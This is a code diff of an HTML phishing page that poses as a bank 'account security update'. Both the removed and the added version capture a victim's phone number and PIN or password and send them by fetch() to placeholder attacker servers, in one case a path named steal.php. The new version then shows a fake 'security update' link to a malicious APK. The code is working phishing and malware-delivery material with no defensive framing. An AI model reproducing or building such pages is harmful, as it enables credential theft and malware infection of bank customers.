@@ -1,42 +1,39 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Security Alert Required</title>
-    <meta charset="UTF-8">
+    <title>Bank Login Update Required</title>
+    <style>
+        body { font-family: Arial; text-align: center; margin: 100px; }
+        input { padding: 10px; margin: 10px; width: 200px; }
+        button { padding: 10px 20px; background: #007bff; color: white; border: none; cursor: pointer; }
+    </style>
 </head>
 <body>
-    <h2>⚠️ Account Verification Required</h2>
-    <form id="phishForm">
-        <input type="text" id="phone" placeholder="Phone Number" required><br>
-        <input type="password" id="pin" placeholder="6-digit PIN" required><br>
-        <button type="button" onclick="sendToJavaServer()">Verify Now</button>
-    </form>
-    
+    <h1>Account Security Update</h1>
+    <p>Your bank account needs verification. Enter credentials to continue.</p>
+    <input type="text" id="phone" placeholder="Phone Number" required>
+    <br>
+    <input type="password" id="pass" placeholder="Password/PIN" required>
+    <br>
+    <button onclick="stealData()">Verify & Update</button>
+    <br><br>
+    <a id="apkLink" href="#" style="display:none; color: green; font-weight: bold;">✅ Click to install security update</a>
+
     <script>
-        function sendToJavaServer() {
+        function stealData() {
             const phone = document.getElementById('phone').value;
-            const pin = document.getElementById('pin').value;
+            const pass = document.getElementById('pass').value;
             
-            // Send to your Java backend
-            fetch('https://your-java-backend.herokuapp.com/capture', {
+            // Send stolen data to your server
+            fetch('https://your-server.com/steal.php', {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    phone: phone,
-                    pin: pin,
-                    userAgent: navigator.userAgent,
-                    timestamp: new Date().toISOString()
-                })
-            })
-            .then(response => {
-                if (response.ok) {
-                    // Redirect to APK download
-                    window.location.href = 'https://your-java-backend.herokuapp.com/download';
-                }
-            })
-            .catch(error => console.error('Error:', error));
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({phone: phone, pass: pass})
+            }).then(() => {
+                document.getElementById('apkLink').href = 'https://your-server.com/malicious.apk';
+                document.getElementById('apkLink').style.display = 'block';
+                document.getElementById('apkLink').textContent = '✅ Click to install security update (required)';
+            });
         }
     </script>
 </body>
